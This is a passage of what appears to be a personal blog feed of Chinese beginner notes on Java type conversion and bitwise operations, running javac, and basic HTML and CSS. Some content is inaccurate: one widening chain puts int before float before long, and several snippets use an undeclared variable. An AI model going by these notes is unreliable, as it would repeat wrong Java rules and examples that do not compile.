class="headerlink" title="布尔类型使用细节"></a>布尔类型使用细节</h3><blockquote><p>不可以使用0或者非整数的值替代false和true(定死)</p></blockquote><h3 id="自动类型转换-小精度转大精度-小容量转大容量"><a href="#自动类型转换-小精度转大精度-小容量转大容量" class="headerlink" title="自动类型转换(小精度转大精度)(小容量转大容量)"></a>自动类型转换(小精度转大精度)(小容量转大容量)</h3><blockquote><p>char -&gt; int -&gt; long -&gt; float -&gt; double<br>byte -&gt; short -&gt; int -&gt; float -&gt; long -&gt; double</p></blockquote><h4 id="自动类型转换细节"><a href="#自动类型转换细节" class="headerlink" title="自动类型转换细节"></a>自动类型转换细节</h4><blockquote><p><strong>1.</strong> 多种类型混合运算：系统自动将所有数据转最大数据类型并进行计算<br><strong>2.</strong> 精度大不能转小<br><strong>3.</strong> byte，short和char直接不会互相自动转换<br><strong>4.</strong> boolean不参与转换<br><strong>5.</strong> 自动提升原则：表达式结果的类型自动提升为操作数最大的数据类型<br><strong>6.</strong> byte ,short ,char他们三者可以计算，在计算时首先转为int类型</p></blockquote><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">name</span> &#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">       <span class="type">byte</span> <span class="variable">b1</span> <span class="operator">=</span> <span class="number">10</span>; <span class="comment">// 判断值是否在范围内，是则赋给它</span></span><br><span class="line">       <span class="type">int</span> <span class="variable">b2</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">       <span class="comment">// byte b3 = b2; // 不成立，赋值的数据已经创建好内存空间</span></span><br><span class="line">       System.out.println();</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="基本数据类型强转"><a href="#基本数据类型强转" class="headerlink" title="基本数据类型强转"></a>基本数据类型强转</h2><p>将容量大转小，需要加上”()”,可能造成精度降低和溢出</p><h3 id="强制类型转换细节"><a href="#强制类型转换细节" class="headerlink" title="强制类型转换细节"></a>强制类型转换细节</h3><blockquote><p><strong>1.</strong>  大到小的转换<br><strong>2.</strong>  针对最近的操作数有效（小括号提升优先级）<br><strong>3.</strong> char类型可以保存int常量值，不能保存int的变量值，需要强转<br><strong>4.</strong> byte和short运算当做int处理</p></blockquote><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">name</span> &#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">       <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> (<span class="type">int</span>)<span class="number">1.8</span>;</span><br><span class="line">       System.out.println(i);</span><br><span class="line"></span><br><span class="line">       <span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">100</span>;</span><br><span class="line">       <span class="type">byte</span> <span class="variable">bx</span> <span class="operator">=</span> (<span class="type">byte</span>)j;</span><br><span class="line">       System.out.println(bx);</span><br><span class="line"></span><br><span class="line">       <span class="type">int</span> <span class="variable">x</span> <span class="operator">=</span> (<span class="type">int</span>)(<span class="number">10.3</span>*<span class="number">3</span>+<span class="number">3.1</span>*<span class="number">4.3</span>);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="基本数据类型和String类型"><a href="#基本数据类型和String类型" class="headerlink" title="基本数据类型和String类型"></a>基本数据类型和String类型</h2><h3 id="基转String"><a href="#基转String" class="headerlink" title="基转String"></a>基转String</h3><p>语法：将 基本数据类型+”” 即可。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">StringToBasic</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// 基本数据类型 -&gt; string</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">n1</span> <span class="operator">=</span> <span class="number">100</span>;</span><br><span class="line">        <span class="type">float</span> <span class="variable">f1</span> <span class="operator">=</span> <span class="number">1.1F</span>;</span><br><span class="line">        <span class="type">double</span> <span class="variable">d1</span> <span class="operator">=</span> <span class="number">4.5</span>;</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">b1</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">s1</span> <span class="operator">=</span> n1 + <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">s2</span> <span class="operator">=</span> f1 + <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">s3</span> <span class="operator">=</span> d1 + <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">s4</span> <span class="operator">=</span> b1 + <span class="string">&quot;&quot;</span>;</span><br><span class="line">        System.out.println(s1 + <span class="string">&quot; &quot;</span> + s2 + <span class="string">&quot; &quot;</span> + s3 + <span class="string">&quot; &quot;</span> + s4);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="String转基"><a href="#String转基" class="headerlink" title="String转基"></a>String转基</h3><p>语法：通过包类型调用转换,&lt;包类型.parse类型(“数据”)&gt;</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">StringToBasic</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">num1</span> <span class="operator">=</span> Integer.parseInt(s5);</span><br><span class="line">        <span class="type">double</span> <span class="variable">num2</span> <span class="operator">=</span> Double.parseDouble(s5);</span><br><span class="line">        <span class="type">float</span> <span class="variable">num3</span> <span class="operator">=</span> Float.parseFloat(s5);</span><br><span class="line">        <span class="type">long</span> <span class="variable">num4</span> <span class="operator">=</span> Long.parseLong(s5);</span><br><span class="line">        <span class="type">byte</span> <span class="variable">num5</span> <span class="operator">=</span> Byte.parseByte(s5);</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">b2</span> <span class="operator">=</span> Boolean.parseBoolean(<span class="string">&quot;true&quot;</span>);</span><br><span class="line">        <span class="type">short</span> <span class="variable">num6</span> <span class="operator">=</span> Short.parseShort(s5);</span><br><span class="line">        <span class="comment">// 看似结果一样，实际上类型已经不一样了</span></span><br><span class="line">        System.out.println(num1 + <span class="string">&quot;  &quot;</span> + num2 + <span class="string">&quot;  &quot;</span> + num3 + <span class="string">&quot;  &quot;</span> + num4 + <span class="string">&quot;  &quot;</span> + num5 +  <span class="string">&quot;  &quot;</span> + b2 +  <span class="string">&quot;  &quot;</span> + num6);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="字符串转字符的办法"><a href="#字符串转字符的办法" class="headerlink" title="字符串转字符的办法"></a>字符串转字符的办法</h4><blockquote><p>注意事项：<br><strong>1.</strong> String转出来的基本数据类型要有效（不能把“world”转成整数）<br><strong>2.</strong> 格式不对会跑出异常</p></blockquote><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">name</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        s5 = <span class="string">&quot;abcdefg&quot;</span>;</span><br><span class="line">        <span class="comment">// 取出第1个字符编译为char</span></span><br><span class="line">        System.out.println(s5.charAt(<span class="number">0</span>));</span><br><span class="line">        <span class="comment">// 同理，可以取出其他字符串。</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>提一嘴：java字符和字符串不相同。</p>]]></content>
      
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java学习日志-03</title>
      <link href="/2023/01/29/java_study_03/"/>
      <url>/2023/01/29/java_study_03/</url>
      
        <content type="html"><![CDATA[<h1 id="位运算★★-gt-gt-lt-lt-gt-gt-gt"><a href="#位运算★★-gt-gt-lt-lt-gt-gt-gt" class="headerlink" title="位运算★★ &gt;&gt; &lt;&lt; &gt;&gt;&gt;"></a>位运算★★ &gt;&gt; &lt;&lt; &gt;&gt;&gt;</h1><h2 id="运算规则"><a href="#运算规则" class="headerlink" title="运算规则"></a>运算规则</h2><blockquote><p><strong>1.算术右移&gt;&gt;:</strong>   低位溢出，符号位不变，并用符号位补溢出的高位<br><strong>2.算术左移&lt;&lt;:</strong>   符号位不变，低位补0<br><strong>3.逻辑右移(无符号右移):</strong> 低位溢出，高位补0<br><strong>4.特别说明:</strong> 没有&lt;&lt;&lt;</p></blockquote><span id="more"></span><h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">name</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="comment">// 1&gt;&gt;2 相当于：</span></span><br><span class="line">        <span class="comment">// 00000001  =&gt; </span></span><br><span class="line">        <span class="comment">// 00000000 01</span></span><br><span class="line">        <span class="comment">// 向低位位移2位，溢出后变为0 =&gt; 十进制结果：0</span></span><br><span class="line">        <span class="comment">// 梳理下就变成：1/2^2=0</span></span><br><span class="line">        System.out.println(<span class="number">1</span>&gt;&gt;<span class="number">2</span>);</span><br><span class="line">        <span class="comment">// 1&lt;&lt;2 相当于：</span></span><br><span class="line">        <span class="comment">// 00000001  =&gt; </span></span><br><span class="line">        <span class="comment">// 00000100</span></span><br><span class="line">        <span class="comment">// 向高位移动2位，十进制结果变为：4</span></span><br><span class="line">        <span class="comment">// 梳理下就变成：1*2^2=4 </span></span><br><span class="line">        System.out.println(<span class="number">1</span>&lt;&lt;<span class="number">2</span>);</span><br><span class="line">        System.out.println(<span class="number">1</span>&gt;&gt;<span class="number">2</span>);</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="补充：二进制的换算"><a href="#补充：二进制的换算" class="headerlink" title="补充：二进制的换算"></a>补充：二进制的换算</h2><p>2进制换为十进制很简单，如下图：<br><img src="https://github.com/linxiao-wangchuan/Data_warehouse_blog/blob/main/box/2023/java_study_03/the_two.png?raw=true" alt="alt text"></p>]]></content>
      
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java学习日志-02</title>
      <link href="/2023/01/28/java%E5%AD%A6%E4%B9%A0%E6%97%A5%E5%BF%972/"/>
      <url>/2023/01/28/java%E5%AD%A6%E4%B9%A0%E6%97%A5%E5%BF%972/</url>
      
        <content type="html"><![CDATA[<h1 id="位运算-重点-java位运算详解★★★★"><a href="#位运算-重点-java位运算详解★★★★" class="headerlink" title="位运算(重点)-java位运算详解★★★★"></a>位运算(重点)-java位运算详解★★★★</h1><blockquote><ol><li>4个位运算符：</li></ol><ul><li>&amp; 位运算与      当俩值为1时为1  </li><li>| 位运算或      有一个为1时为1  </li><li>^ 位运算异或    两者不同时为1  </li><li>~ 位运算非      1转0,0转1  </li></ul></blockquote><p>下面代码实操下位运算符(所有原码反码补码都是2进制代码)</p><span id="more"></span><p><strong>注意：位运算是基于二进制进行的</strong></p><blockquote><p>位运算二计算规则：</p><p>1.正数三码相同（原码反码补码）。<br>2.计算反码：除了符号位，其他的位数0转1，或1转0。<br>3.计算补码：反码+1。<br>4.高位在左低位在右。<br>5.高位的第一位为符号位，且1负0正。<br>6.0的反、补码都是0。<br>7.计算时用补码，返回结果时要转回原码。</p></blockquote><h2 id="解题：2-amp-3"><a href="#解题：2-amp-3" class="headerlink" title="解题：2&amp;3"></a>解题：2&amp;3</h2><p><strong>详解：</strong></p><pre><code>1. 获取2的2原码00000000 00000000 00000000 000000102. 获取2的反码（因为是正数，都一样）00000000 00000000 00000000 000000103. 获取2的补码00000000 00000000 00000000 000000104. 获取3的补码00000000 00000000 00000000 000000115.进行补码的运算00000000 00000000 00000000 0000001000000000 00000000 00000000 00000011------------------------------------00000000 00000000 00000000 000000106.基于正数三码相同，最终获取的原码为：00000000 00000000 00000000 00000010    转换为十进制为：2下面的代码用来鉴别结果<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">name</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        System.out.println(<span class="number">2</span>&amp;<span class="number">3</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></code></pre><h2 id="解题：-2"><a href="#解题：-2" class="headerlink" title="解题：~2"></a>解题：~2</h2><p><strong>详解：</strong></p><pre><code>1. 直接获取2的2补码00000000 00000000 00000000 000000102. 进行~2运算，全部取反11111111 11111111 11111111 111111013. 补码转反码时-111111111 11111111 11111111 111111004. 反码转原码，除了符号位其他位取反10000000 00000000 00000000 00000011将结果转为十进制的最终结果为：-3可以使用下面的代码进行鉴别：<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">name</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        System.out.println(~<span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java学习日志-01</title>
      <link href="/2023/01/27/java%E5%AD%A6%E4%B9%A0%E6%97%A5%E5%BF%97/"/>
      <url>/2023/01/27/java%E5%AD%A6%E4%B9%A0%E6%97%A5%E5%BF%97/</url>
      
        <content type="html"><![CDATA[<p>昨天学习了部分Java，今天在此处做些总结，免得忘了。</p><h1 id="创建并且运行java程序"><a href="#创建并且运行java程序" class="headerlink" title="创建并且运行java程序"></a>创建并且运行java程序</h1><p>为了顺利编译文件并且学习语法，先得使用一个框架,并且执行对应的文件。</p><h2 id="创建"><a href="#创建" class="headerlink" title="创建"></a>创建</h2><p>首先，创建一个名为“name.java”的文件，里面写入如下的文字：</p><pre><code><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">name</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// 基础的打印语句</span></span><br><span class="line">        System.out.println(<span class="string">&quot;Hello world！&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></code></pre><span id="more"></span><h2 id="运行文件"><a href="#运行文件" class="headerlink" title="运行文件"></a>运行文件</h2><p>打开对应的文件夹，在地址栏输入cmd并且回车<br>在黑窗口输入：</p><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">javac -encoding UTF-<span class="number">8</span> name.java</span><br></pre></td></tr></table></figure><p>如果文件写的没问题，报编码错误的话，稍微写简洁些：</p><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">javac name.java</span><br></pre></td></tr></table></figure><p>完成后文件夹下面会生成一个”name.class”的文件，回到黑窗口执行：</p><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">java name</span><br></pre></td></tr></table></figure><p>就可以成功运行java文件了。</p><h1 id="基础的语法"><a href="#基础的语法" class="headerlink" title="基础的语法"></a>基础的语法</h1><p>这就非常多了……</p>]]></content>
      
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>前端学习第二度</title>
      <link href="/2023/01/22/%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E7%AC%AC%E4%BA%8C%E5%BA%A6/"/>
      <url>/2023/01/22/%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E7%AC%AC%E4%BA%8C%E5%BA%A6/</url>
      
        <content type="html"><![CDATA[<p>接下来整下css</p><h1 id="css学习"><a href="#css学习" class="headerlink" title="css学习"></a>css学习</h1><h2 id="布局的位置"><a href="#布局的位置" class="headerlink" title="布局的位置"></a>布局的位置</h2><p>css文件可以通过外部的文件进行导入</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;css/index.css&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>当然，也可以嵌入html网页当中</p><span id="more"></span><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-UA-Compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;IE=edge&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    我是网页的内容模块</span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="comment">/* 我是css的嵌入块 */</span></span></span><br><span class="line"><span class="language-css">    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这种嵌入的模块可以放在网页的任何地方，不过推荐写在 &lt; head &gt; 标签里面。<br>较多代码的时候，推荐模块化的导入的，降低网页的复杂程度。</p><h2 id="一些常见的css样式"><a href="#一些常见的css样式" class="headerlink" title="一些常见的css样式"></a>一些常见的css样式</h2><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 某个类 */</span></span><br><span class="line"><span class="selector-class">.box</span> &#123;</span><br><span class="line">    <span class="comment">/* 背景色 */</span></span><br><span class="line">    <span class="attribute">background-color</span>: red;</span><br><span class="line">    <span class="comment">/* 背景图片位置 */</span></span><br><span class="line">    <span class="attribute">background-position</span>: center center;</span><br><span class="line">    <span class="comment">/* 背景图片是否重复 */</span></span><br><span class="line">    <span class="attribute">background-repeat</span>: no-repeat;</span><br><span class="line">    <span class="comment">/* 背景图 */</span></span><br><span class="line">    <span class="attribute">background-image</span>: <span class="built_in">url</span>(<span class="string">相对的位置链接地址</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 前端 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>前端学习日志</title>
      <link href="/2023/01/22/%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E6%97%A5%E5%BF%97/"/>
      <url>/2023/01/22/%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E6%97%A5%E5%BF%97/</url>
      
        <content type="html"><![CDATA[<h2 id="html简单介绍"><a href="#html简单介绍" class="headerlink" title="html简单介绍"></a>html简单介绍</h2><h3 id="含义"><a href="#含义" class="headerlink" title="含义"></a>含义</h3><pre><code>HTML指的是超文本标记语言(HyperText Markup Language)，它是用来描述网页的一种语言HTML不是一种编程语言，而是一种标记语言(markuplanguage)。标记语言是一套标记标签(markup tag)    所谓超文本，有2 层含义    1.它可以加入图片、声音、动画、多媒体等内容(超越了文本限制 )。    2.它还可以从一个文件跳转到另一个文件，与世界各地主机的文件连接(超级链接文本 )。</code></pre><span id="more"></span><h3 id="理解"><a href="#理解" class="headerlink" title="理解"></a>理解</h3><pre><code>html本身挺简单的，因为html全部都是由标签构成的，要什么直接摆标签就行（跟堆积木差不多）。不过标签也得注意注意，因为标签这东西也不是全能的，写太复杂不好看。精简html是写前端的奥义吧。必须得提一句，前端的各种各样的文件在做项目时最好分开，方便后续的各种更迭操作，例如单独把css文件放一个文件夹，单独把图片文件放一个文件夹等。说一个最简单的例子，炒菜要放各种各样的调味料，而未炒菜前调味料和炒菜的材料等等都是分开的，只有在炒菜的时候需要才会对应的拿点加到正在煮菜的锅里。常见的标签：<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">    1.双标签</span><br><span class="line">        <span class="tag">&lt;<span class="name">html</span>&gt;</span><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line">        还有：<span class="tag">&lt;<span class="name">body</span>&gt;</span> <span class="tag">&lt;<span class="name">head</span>&gt;</span> <span class="tag">&lt;<span class="name">meta</span>&gt;</span> <span class="tag">&lt;<span class="name">link</span>&gt;</span> <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-xml"> <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-handlebars"><span class="language-xml"> <span class="tag">&lt;<span class="name">div</span>&gt;</span>  </span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"><span class="language-xml">    2.单标签</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"><span class="language-xml">        <span class="tag">&lt;<span class="name">input</span>&gt;</span> <span class="tag">&lt;<span class="name">vido</span>&gt;</span> <span class="tag">&lt;<span class="name">img</span>&gt;</span></span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"><span class="language-xml">    ```html</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"><span class="language-xml"></span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"><span class="language-xml">### 兼容问题</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"><span class="language-xml"></span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"><span class="language-xml">    其中，html5新增了许多新的标签，部分很贴合标签的语义，但高版本的html会出现兼容性的问题，css的高版本也同样如此。</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"><span class="language-xml">    例如  <span class="tag">&lt;<span class="name">vido</span>&gt;</span> 就是新增的标签。</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"><span class="language-xml">    所以，在做开发时，得注意这些东西有没有版本限制，如果是移动端就没必要担心兼容性的问题。</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"><span class="language-xml"></span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"><span class="language-xml">### 常见的一些html标签</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"><span class="language-xml"></span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"><span class="language-xml">```html</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"><span class="language-xml">盒子标签</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"><span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span> </span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"><span class="language-xml"></span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"><span class="language-xml">列表标签</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"><span class="language-xml"><span class="tag">&lt;<span class="name">ul</span>&gt;</span></span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"><span class="language-xml">    <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"><span class="language-xml">    <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"><span class="language-xml">    <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"><span class="language-xml"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"><span class="language-xml"></span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"><span class="language-xml">链接标签</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"><span class="language-xml"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;链接地址&quot;</span>&gt;</span></span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"><span class="language-xml"></span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"><span class="language-xml">输入输出的input</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"><span class="language-xml"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span>&gt;</span></span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"><span class="language-xml"></span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"><span class="language-xml">表单标签</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"><span class="language-xml"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"><span class="language-xml"></span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"><span class="language-xml">表格标签</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"><span class="language-xml"><span class="tag">&lt;<span class="name">table</span>&gt;</span></span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"><span class="language-xml">    <span class="comment">&lt;!-- 第一行 --&gt;</span></span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"><span class="language-xml">    <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"><span class="language-xml">        <span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"><span class="language-xml">        <span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"><span class="language-xml">        <span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"><span class="language-xml">    <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"><span class="language-xml">    <span class="comment">&lt;!-- 第二行 --&gt;</span></span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"><span class="language-xml">    <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"><span class="language-xml">        <span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"><span class="language-xml">        <span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"><span class="language-xml">        <span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"><span class="language-xml">    <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"><span class="language-xml"><span class="tag">&lt;/<span class="name">table</span>&gt;</span></span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"><span class="language-xml"></span></span></span></span><br></pre></td></tr></table></figure></code></pre><h2 id="引用修饰文件的说明"><a href="#引用修饰文件的说明" class="headerlink" title="引用修饰文件的说明"></a>引用修饰文件的说明</h2><h3 id="html的鸡肋处"><a 